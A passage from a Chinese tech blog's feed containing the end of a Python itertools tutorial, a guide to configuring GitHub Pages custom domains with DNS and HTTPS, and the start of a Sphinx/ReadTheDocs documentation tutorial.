class="number">3</span></span><br><span class="line"></span><br><span class="line">group_obj = groupby([<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>], key=smaller_than_3)</span><br><span class="line"><span class="keyword">for</span> key, group <span class="keyword">in</span> group_obj:</span><br><span class="line">    <span class="built_in">print</span>(key, <span class="built_in">list</span>(group))</span><br><span class="line"></span><br><span class="line"><span class="comment"># 或者使用 lambda 表达式，比如：包含 &#x27;i&#x27; 的词</span></span><br><span class="line">group_obj = groupby([<span class="string">&quot;hi&quot;</span>, <span class="string">&quot;nice&quot;</span>, <span class="string">&quot;hello&quot;</span>, <span class="string">&quot;cool&quot;</span>], key=<span class="keyword">lambda</span> x: <span class="string">&quot;i&quot;</span> <span class="keyword">in</span> x)</span><br><span class="line"><span class="keyword">for</span> key, group <span class="keyword">in</span> group_obj:</span><br><span class="line">    <span class="built_in">print</span>(key, <span class="built_in">list</span>(group))</span><br><span class="line">    </span><br><span class="line">persons = [&#123;<span class="string">&#x27;name&#x27;</span>: <span class="string">&#x27;Tim&#x27;</span>, <span class="string">&#x27;age&#x27;</span>: <span class="number">25</span>&#125;, &#123;<span class="string">&#x27;name&#x27;</span>: <span class="string">&#x27;Dan&#x27;</span>, <span class="string">&#x27;age&#x27;</span>: <span class="number">25</span>&#125;, </span><br><span class="line">           &#123;<span class="string">&#x27;name&#x27;</span>: <span class="string">&#x27;Lisa&#x27;</span>, <span class="string">&#x27;age&#x27;</span>: <span class="number">27</span>&#125;, &#123;<span class="string">&#x27;name&#x27;</span>: <span class="string">&#x27;Claire&#x27;</span>, <span class="string">&#x27;age&#x27;</span>: <span class="number">28</span>&#125;]</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> key, group <span class="keyword">in</span> groupby(persons, key=<span class="keyword">lambda</span> x: x[<span class="string">&#x27;age&#x27;</span>]):</span><br><span class="line">    <span class="built_in">print</span>(key, <span class="built_in">list</span>(group))</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="literal">True</span> [<span class="number">1</span>, <span class="number">2</span>]</span><br><span class="line"><span class="literal">False</span> [<span class="number">3</span>, <span class="number">4</span>]</span><br><span class="line"><span class="literal">True</span> [<span class="string">&#x27;hi&#x27;</span>, <span class="string">&#x27;nice&#x27;</span>]</span><br><span class="line"><span class="literal">False</span> [<span class="string">&#x27;hello&#x27;</span>, <span class="string">&#x27;cool&#x27;</span>]</span><br><span class="line"><span class="number">25</span> [&#123;<span class="string">&#x27;name&#x27;</span>: <span class="string">&#x27;Tim&#x27;</span>, <span class="string">&#x27;age&#x27;</span>: <span class="number">25</span>&#125;, &#123;<span class="string">&#x27;name&#x27;</span>: <span class="string">&#x27;Dan&#x27;</span>, <span class="string">&#x27;age&#x27;</span>: <span class="number">25</span>&#125;]</span><br><span class="line"><span class="number">27</span> [&#123;<span class="string">&#x27;name&#x27;</span>: <span class="string">&#x27;Lisa&#x27;</span>, <span class="string">&#x27;age&#x27;</span>: <span class="number">27</span>&#125;]</span><br><span class="line"><span class="number">28</span> [&#123;<span class="string">&#x27;name&#x27;</span>: <span class="string">&#x27;Claire&#x27;</span>, <span class="string">&#x27;age&#x27;</span>: <span class="number">28</span>&#125;]</span><br></pre></td></tr></table></figure><h3><span id="wu-xian-die-dai-qi-count-cycle-repeat">无限迭代器：count(), cycle(), repeat()</span></h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> itertools <span class="keyword">import</span> count, cycle, repeat</span><br><span class="line"><span class="comment"># count(x): 从 x 开始计数: x, x+1, x+2, x+3...</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> count(<span class="number">10</span>):</span><br><span class="line">    <span class="built_in">print</span>(i)</span><br><span class="line">    <span class="keyword">if</span>  i &gt;= <span class="number">13</span>:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># cycle(iterable) : 通过迭代无限循环</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;&quot;</span>)</span><br><span class="line"><span class="built_in">sum</span> = <span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> cycle([<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>]):</span><br><span class="line">    <span class="built_in">print</span>(i)</span><br><span class="line">    <span class="built_in">sum</span> += i</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">sum</span> &gt;= <span class="number">12</span>:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># repeat(x): 无限重复x或重复n次</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;&quot;</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> repeat(<span class="string">&quot;A&quot;</span>, <span class="number">3</span>):</span><br><span class="line">    <span class="built_in">print</span>(i)</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="number">10</span></span><br><span class="line"><span class="number">11</span></span><br><span class="line"><span class="number">12</span></span><br><span class="line"><span class="number">13</span></span><br><span class="line"></span><br><span class="line"><span class="number">1</span></span><br><span class="line"><span class="number">2</span></span><br><span class="line"><span class="number">3</span></span><br><span class="line"><span class="number">1</span></span><br><span class="line"><span class="number">2</span></span><br><span class="line"><span class="number">3</span></span><br><span class="line"></span><br><span class="line">A</span><br><span class="line">A</span><br><span class="line">A</span><br></pre></td></tr></table></figure><blockquote><p>GitHub repo: <a href="https://github.com/qiwihui/blog">qiwihui/blog</a></p><p>Follow me: <a href="https://github.com/qiwihui">@qiwihui</a></p><p>Site: <a href="https://qiwihui.com">QIWIHUI</a></p></blockquote><h3><span id="comments">Comments</span></h3>]]></content>
    
    <summary type="html">
    
      07. Itertools — Python 进阶
    
    </summary>
    
      <category term="技术" scheme="https://qiwihui.com/categories/%E6%8A%80%E6%9C%AF/"/>
    
    
      <category term="技术" scheme="https://qiwihui.com/tags/%E6%8A%80%E6%9C%AF/"/>
    
      <category term="Python" scheme="https://qiwihui.com/tags/Python/"/>
    
  </entry>
  
  <entry>
    <title>GitHub Pages 自定义域名实践整理</title>
    <link href="https://qiwihui.com/qiwihui-blog-47/"/>
    <id>https://qiwihui.com/qiwihui-blog-47/</id>
    <published>2022-08-13T01:54:25.310Z</published>
    <updated>2024-05-15T02:25:31.470Z</updated>
    
    <content type="html"><![CDATA[<p>这篇博客将整理在配置博客以及项目 Pages 的自定义域名过程，遇到的问题以及解决方法。<a href="https://help.github.com/articles/using-a-custom-domain-with-github-pages/">Github 的文档</a>对于如何配置自定义域名有详细的介绍，这里不会全部翻译，只重点记录实践的过程，内容涉及为用户网站，公司网站，以及项目网站添加 <code>Apex</code> 域名（<a href="http://qiwihui.com">qiwihui.com</a>），二级域名（<a href="http://www.qiwihui.com">www.qiwihui.com</a>）以及开启 HTTPS。最后，所有指向 <code>www.qiwihui.com</code> 的请求将会被重定向至 <code>https://qiwihui.com</code>。</p><span id="more"></span><h2><span id="yi-xie-zhu-yi">一些注意</span></h2><h3><span id="github-zhi-chi-de-zi-ding-yi-yu-ming-lei-xing">Github 支持的自定义域名类型</span></h3><table><thead><tr><th>支持的自定义域名类型</th><th>域名例子</th></tr></thead><tbody><tr><td>www subdomain</td><td><code>www.example.com</code></td></tr><tr><td><strong>one apex domain &amp; one www subdomain</strong></td><td><code>example.com</code> &amp; <code>www.example.com</code></td></tr><tr><td>apex domain</td><td><code>example.com</code></td></tr><tr><td>custom subdomain</td><td><code>blog.example.com</code></td></tr></tbody></table><h3><span id="github-pages-zhan-zhi-chi-de-yu-ming">GitHub Pages 站支持的域名</span></h3><table><thead><tr><th>GitHub Pages 站类型</th><th>在 Github 上 Pages 的默认域名和主机地址</th><th>页面被如何重定向</th><th>自定义域名举例</th></tr></thead><tbody><tr><td>User Pages 站</td><td><code>username.github.io</code></td><td>自动重定向到设置的自定义域名</td><td><code>user.example.com</code></td></tr><tr><td>Organization Pages 站</td><td><code>orgname.github.io</code></td><td>自动重定向到设置的自定义域名</td><td><code>org.example.com</code></td></tr><tr><td>用户拥有的 Project Pages 站</td><td><code>username.github.io/projectname</code></td><td>自动重定向到 User Pages 站自定义域名的子目录（<code>user.example.com/projectname</code>）</td><td><code>project.example.com</code></td></tr><tr><td>公司拥有的 Project Pages 站</td><td><code>orgname.github.io/projectname</code></td><td>自动重定向到 Organization Pages 站自定义域名的子目录（<code>org.example.com/projectname</code>）</td><td><code>project.example.com</code></td></tr></tbody></table><h2><span id="yi-ge-ren-pages-xiang-mu-wei-li-zi">以个人 Pages 项目为例子</span></h2><h3><span id="kai-qi-github-pages-gong-neng">开启 Github Pages 功能</span></h3><p>在项目 <code>Settings</code> 中，找到 <code>GitHub Pages</code> 这一区域，选择 <code>Source</code> 为对应的要部署的分支，这里我选择 <code>gh-pages branch</code>：</p><p><img src="https://user-images.githubusercontent.com/3297411/51802835-b4756580-2288-11e9-8aab-b5add026d737.png" alt="gh-pages"></p><p>其中，选择 <code>master branch</code> 会视 <code>/README.md</code> 为 web 的 <code>index.html</code>，选择 <code>master branch /docs folder</code> 会视 <code>/docs/README.md</code> 为 web 的 <code>index.html</code>。</p><h3><span id="zai-xiang-mu-pei-zhi-zhong-zi-ding-yi-yu-ming">在项目配置中自定义域名</span></h3><p>在 <code>Custom domain</code> 中添加自己的域名并保存：</p><p><img src="https://user-images.githubusercontent.com/3297411/51802765-141f4100-2288-11e9-8e8d-8980ed3e63b3.png" alt="custom-domain"></p><p>或者，在项目分支中添加 <code>CNAME</code> 文件，<code>CNAME</code> 文件的内容为</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">qiwihui.com</span><br></pre></td></tr></table></figure><p>这里推荐第二种，尤其对于有设置 CI 的项目，因为 CI 上将第一种设置覆盖。这一步是比较重要却又容易忽视的一步：</p><ul><li>如果添加到 GitHub Pages 中的是 <code>qiwihui.com</code>，那么 <code>www.qiwihui.com</code> 会被重定向到 <code>qiwihui.com</code>；</li><li>如果添加到 GitHub Pages 中的是 <code>www.qiwihui.com</code>，那么 <code>qiwihui.com</code> 会被重定向到 <code>www.qiwihui.com</code>；</li></ul><p>这里我选择重定向到 <code>www.qiwihui.com</code>，所以设置为 <code>qiwihui.com</code></p><h3><span id="tian-jia-dns-ji-lu">添加 DNS 记录</span></h3><p>为了能设置<code>Apex</code> 域名，需要在 DNS 中配置 A 记录指向 github 的 IP：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">185.199.108.153</span><br><span class="line">185.199.109.153</span><br><span class="line">185.199.110.153</span><br><span class="line">185.199.111.153</span><br></pre></td></tr></table></figure><p><img src="https://user-images.githubusercontent.com/3297411/51803023-1040ee00-228b-11e9-90f7-20a4a99d9069.png" alt="a-record"></p><p>同时，设置 <code>CNAME</code>  记录将 <code>www.qiwihui.com</code> 指向 <code>qiwihui.github.io</code>，即 <code>&lt;你的 github 用户名&gt;.github.io</code>。对于公司来说，这个地址是 <code>&lt;公司名称&gt;.github.io</code>。</p><p><img src="https://user-images.githubusercontent.com/3297411/51803045-539b5c80-228b-11e9-8e60-03c854f7097b.png" alt="www-record"></p><h3><span id="que-ren-dns-ji-lu">确认 DNS 记录</span></h3><p>以下是设置好之后的 DNS 记录情况：</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ dig +noall +answer qiwihui.com</span><br><span class="line">qiwihui.com.            60      IN      A       185.199.111.153</span><br><span class="line">qiwihui.com.            60      IN      A       185.199.110.153</span><br><span class="line">qiwihui.com.            60      IN      A       185.199.108.153</span><br><span class="line">qiwihui.com.            60      IN      A       185.199.109.153</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ dig www.qiwihui.com +nostats +nocomments +nocmd </span><br><span class="line"></span><br><span class="line">; &lt;&lt;&gt;&gt; DiG 9.10.6 &lt;&lt;&gt;&gt; www.qiwihui.com +nostats +nocomments +nocmd</span><br><span class="line">;; global options: +cmd</span><br><span class="line">;www.qiwihui.com.               IN      A</span><br><span class="line">www.qiwihui.com.        28      IN      CNAME   qiwihui.github.io.</span><br><span class="line">qiwihui.github.io.      28      IN      A       185.199.110.153</span><br><span class="line">qiwihui.github.io.      28      IN      A       185.199.108.153</span><br><span class="line">qiwihui.github.io.      28      IN      A       185.199.111.153</span><br><span class="line">qiwihui.github.io.      28      IN      A       185.199.109.153</span><br></pre></td></tr></table></figure><h3><span id="ssl-https-pei-zhi-qiang-lie-tui-jian-kai-qi">SSL（HTTPS）配置，强烈推荐开启</span></h3><p>勾选 <code>Enforce HTTPS</code></p><p><img src="https://user-images.githubusercontent.com/3297411/51798435-2760eb00-224d-11e9-917c-a4942a652d35.png" alt="enfore_https"></p><p>Github 会自动保持 HTTPS 证书的有效。</p><h2><span id="xiang-mu-pages">项目 Pages</span></h2><p>当给项目设置 Pages 时，一般都已经有一个个人或者公司的 Pages 了，如果没有，就可以按以上的过程添加。如果已经设置了，则只需要很简单的两步即可：</p><p>以下以个人项目 <code>[qiwihui/fullstackpython.com](https://github.com/qiwihui/fullstackpython.com)</code>，设置地址为 <code>fullstackpython.qiwihui.com</code></p><ol><li>在项目中开启 Github Pages，并添加 <code>CNAME</code> 文件指向 <code>fullstackpython.qiwihui.com</code>：</li></ol><p><img src="https://user-images.githubusercontent.com/3297411/51803267-2dc38700-228e-11e9-8ee8-03e80ec711c9.png" alt="fullstackpython"></p><ol start="2"><li>在 DNS 记录中添加 CNAME 记录将 <code>fullstackpython.qiwihui.com</code> 指向 <code>qiwihui.github.io</code>，即 <code>&lt;你的 github 用户名&gt;.github.io</code>。对于公司来说，这个地址是 <code>&lt;公司名称&gt;.github.io</code>。</li></ol><p><img src="https://user-images.githubusercontent.com/3297411/51803299-8004a800-228e-11e9-8721-e640e4377df1.png" alt="fullstackpython-record"></p><p>一段时间后即可。</p><h2><span id="can-kao">参考</span></h2><ul><li><a href="https://help.github.com/articles/using-a-custom-domain-with-github-pages/">Using a custom domain with GitHub Pages</a></li><li><a href="https://help.github.com/articles/custom-domain-redirects-for-github-pages-sites/">Custom domain redirects for GitHub Pages sites</a></li><li><a href="https://stackoverflow.com/a/9123911/3218128">Custom domain for GitHub project pages 的回答</a></li><li><a href="https://anmonteiro.com/2015/08/custom-subdomains-in-github-project-pages/">Custom subdomains in GitHub project pages</a></li></ul><h3><span id="comments">Comments</span></h3>]]></content>
    
    <summary type="html">
    
      GitHub Pages 自定义域名实践整理
    
    </summary>
    
      <category term="技术" scheme="https://qiwihui.com/categories/%E6%8A%80%E6%9C%AF/"/>
    
    
      <category term="技术" scheme="https://qiwihui.com/tags/%E6%8A%80%E6%9C%AF/"/>
    
  </entry>
  
  <entry>
    <title>使用 Sphinx 撰写技术文档并生成 PDF 总结</title>
    <link href="https://qiwihui.com/qiwihui-blog-57/"/>
    <id>https://qiwihui.com/qiwihui-blog-57/</id>
    <published>2022-08-13T01:54:25.310Z</published>
    <updated>2024-05-15T02:25:31.468Z</updated>
    
    <content type="html"><![CDATA[<p>这几天准备编排部分翻译的书籍和文档，找了好些工具，最终定格在 Sphinx 上，并基于 <a href="https://readthedocs.org">ReadTheDocs</a> 提供的 SaaS 服务进行分发和分享。本篇博客是对整个过程的一次记录和总结。</p><p>项目代码：<a href="https://github.com/qiwihui/sphinx-doc-starter">qiwihui/sphinx-doc-starter</a></p><h2><span id="ren-shi-sphinx">认识 Sphinx</span></h2><p><a href="http://sphinx-doc.org/">Sphinx</a> 是一个基于 Python 的文档生成项目。最早只是用来生成 <a href="https://docs.python.org/3/">Python</a> 的项目文档，使用 <em>reStructuredText</em> 格式。但随着项目的逐渐完善，很多非 Python 的项目也采用 Sphinx 作为文档写作工具，甚至完全可以用 Sphinx 来写书。</p><p>使用 <a href="http://sphinx-doc-zh.readthedocs.org/en/latest/">Sphinx 生成文档的优点</a>包括：</p><ul><li><em>丰富的输出格式</em>: 支持输出为 HTML（包括 Windows 帮助文档），LaTeX（可以打印PDF版本）, manual pages（man 文档）, 纯文本等若干种格式；</li><li><em>完备的交叉引用</em>: 语义化的标签，并可以自动化链接函数、类、引文、术语等；</li><li><em>明晰的分层结构</em>: 轻松定义文档树，并自动化链接同级/父级/下级文章；</li><li><em>美观的自动索引</em>: 可自动生成美观的模块索引；</li><li><em>精确的语法高亮</em>: 基于 Pygments 自动生成语法高亮；</li><li><em>开放的扩展</em>: 支持代码块的自动测试，自动包含 Python 的模块自述文档，等等。</li></ul><span id="more"></span><h2><span id="kai-shi">开始</span></h2><p>这个过程包括如下步骤：</p><ul><li>安装 Sphinx</li><li>第一个文档</li><li>在线托管</li><li>生成 PDF</li></ul><h3><span id="an-zhuang-sphinx">安装 Sphinx</span></h3><p>Sphinx 依赖于 Python，并提供了 Python 包，所以使用 pip 安装既可。这里我只安装了 <code>sphinx-doc</code> 这个包。</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">pip install sphinx-doc</span><br></pre></td></tr></table></figure><p>这时，通过 bash 自动补全（连续两下 <code>tab</code>），可以看到有几个命令，Sphinx 推荐使用 <code>sphinx-quickstart</code>，这是一个设置向导。</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">sphinx-</span></span><br><span class="line">sphinx-apidoc      sphinx-autogen     sphinx-build       sphinx-quickstart</span><br></pre></td></tr></table></figure><h3><span id="she-zhi-sphinx">设置 Sphinx</span></h3><p>运行 <code>sphinx-quickstart</code>，以下主要设置项目名称，作者名称以及语言（<code>zh_CN</code>）即可，其他默认。</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">sphinx-quickstart</span></span><br><span class="line">Welcome to the Sphinx 1.8.4 quickstart utility.</span><br><span class="line"></span><br><span class="line">Please enter values for the following settings (just press Enter to</span><br><span class="line">accept a default value, if one is given in brackets).</span><br><span class="line"></span><br><span class="line">Selected root path: .</span><br><span class="line"></span><br><span class="line">You have two options for placing the build directory for Sphinx output.</span><br><span class="line">Either, you use a directory &quot;_build&quot; within the root path, or you separate</span><br><span class="line">&quot;source&quot; and &quot;build&quot; directories within the root path.</span><br><span class="line"><span class="meta prompt_">&gt; </span><span class="language-bash">Separate <span class="built_in">source</span> and build directories (y/n) [n]: y</span></span><br><span class="line"></span><br><span class="line">Inside the root directory, two more directories will be created; &quot;_templates&quot;</span><br><span class="line">for custom HTML templates and &quot;_static&quot; for custom stylesheets and other static</span><br><span class="line">files. You can enter another prefix (such as &quot;.&quot;) to replace the underscore.</span><br><span class="line"><span class="meta prompt_">&gt; </span><span class="language-bash">Name prefix <span class="keyword">for</span> templates and static <span class="built_in">dir</span> [_]:</span> </span><br><span class="line"></span><br><span class="line">The project name will occur in several places in the built documentation.</span><br><span class="line"><span class="meta prompt_">&gt; </span><span class="language-bash">Project name: 一本书</span></span><br><span class="line"><span class="meta prompt_">&gt; </span><span class="language-bash">Author name(s): qiwihui</span></span><br><span class="line"><span class="meta prompt_">&gt; </span><span class="language-bash">Project release []: 0.0.1</span></span><br><span class="line"></span><br><span class="line">If the documents are to be written in a language other than English,</span><br><span class="line">you can select a language here by its language code. Sphinx will then</span><br><span class="line">translate text that it generates into that language.</span><br><span class="line"></span><br><span class="line">For a list of supported codes, see</span><br><span class="line">http://sphinx-doc.org/config.html#confval-language.</span><br><span class="line"><span class="meta prompt_">&gt; </span><span class="language-bash">Project language [en]: zh_CN</span></span><br><span class="line"></span><br><span class="line">The file name suffix for source files. Commonly, this is either &quot;.txt&quot;</span><br><span class="line">or &quot;.rst&quot;.  Only files with this suffix are considered documents.</span><br><span class="line"><span class="meta prompt_">&gt; </span><span class="language-bash">Source file suffix [.rst]:</span> </span><br><span class="line"></span><br><span class="line">One document is special in that it is considered the top node of the</span><br><span class="line">&quot;contents tree&quot;, that is, it is the root of the hierarchical structure</span><br><span class="line">of the documents. Normally, this is &quot;index&quot;, but if your &quot;index&quot;</span><br><span class="line">document is a custom template, you can also set this to another filename.</span><br><span class="line"><span class="meta prompt_">&gt; </span><span class="language-bash">Name of your master document (without suffix) [index]:</span> </span><br><span class="line">Indicate which of the following Sphinx extensions should be enabled:</span><br><span class="line"><span class="meta prompt_">&gt; </span><span class="language-bash">autodoc: automatically insert docstrings from modules (y/n) [n]:</span> </span><br><span class="line"><span class="meta prompt_">&gt; </span><span class="language-bash">doctest: automatically <span class="built_in">test</span> code snippets <span class="keyword">in</span> doctest blocks (y/n) [n]:</span> </span><br><span class="line"><span class="meta prompt_">&gt; </span><span class="language-bash">intersphinx: <span class="built_in">link</span> between Sphinx documentation of different projects (y/n) [n]:</span> </span><br><span class="line"><span class="meta prompt_">&gt; </span><span class="language-bash">todo: write <span class="string">&quot;todo&quot;</span> entries that can be shown or hidden on build (y/n) [n]:</span> </span><br><span class="line"><span class="meta prompt_">&gt; </span><span class="language-bash">coverage: checks <span class="keyword">for</span> documentation coverage (y/n) [n]:</span> </span><br><span class="line"><span class="meta prompt_">&gt; </span><span class="language-bash">imgmath: include math, rendered as PNG or SVG images (y/n) [n]:</span> </span><br><span class="line"><span class="meta prompt_">&gt; </span><span class="language-bash">mathjax: include math, rendered <span class="keyword">in</span> the browser by MathJax (y/n) [n]:</span> </span><br><span class="line"><span class="meta prompt_">&gt; </span><span class="language-bash">ifconfig: conditional inclusion of content based on config values (y/n) [n]:</span> </span><br><span class="line"><span class="meta prompt_">&gt; </span><span class="language-bash">viewcode: include links to the <span class="built_in">source</span> code of documented Python objects (y/n) [n]:</span> </span><br><span class="line"><span class="meta prompt_">&gt; </span><span class="language-bash">githubpages: create .nojekyll file to publish the document on GitHub pages (y/n) [n]:</span> </span><br><span class="line"></span><br><span class="line">A Makefile and a Windows command file can be generated for you so that you</span><br><span class="line">only have to run e.g. `make html` instead of invoking sphinx-build</span><br><span class="line">directly.</span><br><span class="line"><span class="meta prompt_">&gt; </span><span class="language-bash">Create Makefile? (y/n) [y]:</span> </span><br><span class="line"><span class="meta prompt_">&gt; </span><span class="language-bash">Create Windows <span class="built_in">command</span> file? (y/n) [y]:</span> </span><br><span class="line"></span><br><span class="line">Creating file ./source/conf.py.</span><br><span class="line">Creating file ./source/index.rst.</span><br><span class="line">Creating file ./Makefile.</span><br><span class="line">Creating file ./make.bat.</span><br><span class="line"></span><br><span class="line">Finished: An initial directory structure has been created.</span><br><span class="line"></span><br><span class="line">You should now populate your master file ./source/index.rst and create other documentation</span><br><span class="line">source files. Use the Makefile to build the docs, like so:</span><br><span class="line">   make builder</span><br><span class="line">where &quot;builder&quot; is one of the supported builders, e.g. html, latex or linkcheck.</span><br></pre></td></tr></table></figure><p>解释1，整个设置过程包括：</p><ol><li><p>是否分离源文件目录 <code>source</code> 和生成文件目录 <code>build</code>，默认否；</p></li><li><p>模板目录 <code>templates</code> 和静态文件目录 <code>static</code> 前缀，默认为<code>_</code>；</p></li><li><p>项目名称；</p></li><li><p>项目作者；</p></li><li><p>项目版本，默认为空；</p></li><li><p>项目语言，默认为 <code>en</code>；</p></li><li><p>文档扩展名，默认为 <code>.rst</code>；</p></li><li><p>首页文件名，默认为 <code>index</code>；</p></li><li><p>开启的扩展，均默认为否：</p><ul><li>autodoc</li><li>doctest</li><li>intersphinx</li><li>todo</li><li>coverage</li><li>imgmath</li><li>mathjax</li><li>ifconfig</li><li>viewcode</li><li>githubpages</li></ul></li><li><p>生成 Makefile，默认是；</p></li><li><p>生成 Windows 用命令行，默认是。</p></li></ol><p>解释2，项目目录文件结构如下：</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sphinx-test</span><br><span class="line">├── Makefile</span><br><span class="line">├── build</span><br><span class="line">├── make.bat</span><br><span class="line">└── source</span><br><span class="line">    ├── _static</span><br><span class="line">    ├── _templates</span><br><span class="line">    ├── conf.py</span><br><span class="line">    └── index.rst</span><br></pre></td></tr></table></figure><p>其中：</p><ul><li><code>Makefile</code>：可以看作是一个包含指令的文件，在使用 make 命令时，可以使用这些指令来构建文档输出。</li><li><code>build</code>：生成的文件的输出目录。</li><li><code>make.bat</code>：Windows 用命令行。</li><li><code>_static</code>：静态文件目录，比如图片等。</li><li><code>_templates</code>：模板目录。</li><li><code>conf.py</code>：存放 Sphinx 的配置，包括在 <code>sphinx-quickstart</code> 时选中的那些值，可以自行定义其他的值。</li><li><code>index.rst</code>：文档项目起始文件。</li></ul><p>接下来看看默认生成的内容：</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">make html</span></span><br><span class="line">Running Sphinx v1.8.4</span><br><span class="line">loading translations [zh_CN]... done</span><br><span class="line">making output directory...</span><br><span class="line">building [mo]: targets for 0 po files that are out of date</span><br><span class="line">building [html]: targets for 1 source files that are out of date</span><br><span class="line">updating environment: 1 added, 0 changed, 0 removed</span><br><span class="line">reading sources... [100%] index                                                                                                         looking for now-outdated files... none found</span><br><span class="line">pickling environment... done</span><br><span class="line">checking consistency... done</span><br><span class="line">preparing documents... done</span><br><span class="line">writing output... [100%] index                                                                                                          generating indices... genindex</span><br><span class="line">writing additional pages... search</span><br><span class="line">copying static files... done</span><br><span class="line">copying extra files... done</span><br><span class="line">dumping search index in Chinese (code: zh) ... done</span><br><span class="line">dumping object inventory... done</span><br><span class="line">build succeeded.</span><br><span class="line"></span><br><span class="line">The HTML pages are in build/html.</span><br></pre></td></tr></table></figure><p>然后直接在浏览器中打开 <code>build/html/index.html</code> 这个文件。</p><p><img src="https://user-images.githubusercontent.com/3297411/53294694-86068e00-3826-11e9-93e6-4f3ad80cc245.png" alt="initial"></p><p>默认风格为 <code>alabaster</code>，可以改成 ReadTheDocs 的风格： <code>sphinx_rtd_theme</code>。</p><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="comment"># -- Options for HTML output -------------------------------------------------</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># The theme to use for HTML and HTML Help pages.  See the documentation for</span></span><br><span class="line"><span class="comment"># a list of builtin themes.</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line">html_theme = <span class="string">&#x27;sphinx_rtd_theme&#x27;</span></span><br></pre></td></tr></table></figure><p><img src="https://user-images.githubusercontent.com/3297411/53294697-9585d700-3826-11e9-9eab-13d1d4e46aa4.png" alt="rtd_theme"></p><h3><span id="di-yi-ge-wen-dang">第一个文档</span></h3><p>我们以一下文档为例：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">This is a Title</span><br><span class="line">===============</span><br><span class="line">That has a paragraph about a main subject and is set when the &#x27;=&#x27;</span><br><span class="line">is at least the same length of the title itself.</span><br><span class="line"></span><br><span class="line">Subject Subtitle</span><br><span class="line">----------------</span><br><span class="line">Subtitles are set with &#x27;-&#x27; and are required to have the same length</span><br><span class="line">of the subtitle itself, just like titles.</span><br><span class="line"></span><br><span class="line">Lists can be unnumbered like:</span><br><span class="line"></span><br><span class="line"> * Item Foo</span><br><span class="line"> * Item Bar</span><br><span class="line"></span><br><span class="line">Or automatically numbered:</span><br><span class="line"></span><br><span class="line"> #. Item 1</span><br><span class="line"> #. Item 2</span><br><span class="line"></span><br><span class="line">Inline Markup</span><br><span class="line">-------------</span><br><span class="line">Words can have *emphasis in italics* or be **bold** and you can define</span><br><span class="line">code samples with back quotes, like when you talk about a command: ``sudo``</span><br><span class="line">gives you super user powers!</span><br></pre></td></tr></table></figure><p>将之写入 <code>example.rst</code> 中，并修改 <code>index.rst</code> 为:</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Welcome to 一本书&#x27;s documentation!</span><br><span class="line">==================================</span><br><span class="line"></span><br><span class="line">.. toctree::</span><br><span class="line">   :maxdepth: 2</span><br><span class="line">   :caption: 目录:</span><br><span class="line"></span><br><span class="line">   example</span><br><span class="line"></span><br><span class="line">Indices and tables</span><br><span class="line">==================</span><br><span class="line"></span><br><span class="line">* :ref:`genindex`</span><br><span class="line">* :ref:`modindex`</span><br><span class="line">* :ref:`search`</span><br></pre></td></tr></table></figure><p>重新编译，这时文档已经改变。</p><p><img src="https://user-images.githubusercontent.com/3297411/53294701-a5052000-3826-11e9-972f-85631118b372.png" alt="first_doc"><img src="https://user-images.githubusercontent.com/3297411/53294703-a9c9d400-3826-11e9-9c63-9fd73f19792c.png" alt="first_doc_page"></p><h3><span id="zai-xian-tuo-guan">在线托管</span></h3><p><a href="https://readthedocs.org">ReadTheDocs</a> 可是直接用于托管 sphinx 生成的网页文档。将之前的文档用 Git 管理，并推送到 Github，然后在 ReadTheDocs 中 <code>Import a Project</code> 即可。</p><p><img src="https://user-images.githubusercontent.com/3297411/53294710-dd0c6300-3826-11e9-9b50-f257ccc9049d.png" alt="rtd"></p><p>另外，可以设置自定义域名：</p><ol><li>在域名管理中添加 DNS 的 CNAME 记录到 <code>readthedocs.io</code>，比如 <code>onebook.qiwihui.com</code></li><li>在项目的 <code>Admin</code> -&gt; <code>Domains</code> 中设置上一步添加的域名，开启 HTTPS，保存即可。</li></ol><p><img src="https://user-images.githubusercontent.com/3297411/53294706-b4846900-3826-11e9-8cc7-570d0f6e4430.png" alt="add_new_domain"></p><p>过程很简单。</p><h3><span id="sheng-cheng-pdf">生成 PDF</span></h3><p>Sphinx 生成 PDF 的过程先将 rst 转换为 tex，再生成 PDF。这个过程遇到了比较多的坑，最后总结下来过程如下：</p><p>首先，安装 Tex 环境。在 Mac 上，推荐安装 <code>MacTex</code> 而不是 <code>BasicTex</code>，对于新手来说 BasicTex 上需要自己处理很多依赖问题。完成后使用 <code>tlmgr</code> 更新 TexLive。</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">brew cask install mactex</span></span><br><span class="line"><span class="meta prompt_">$ </span><span 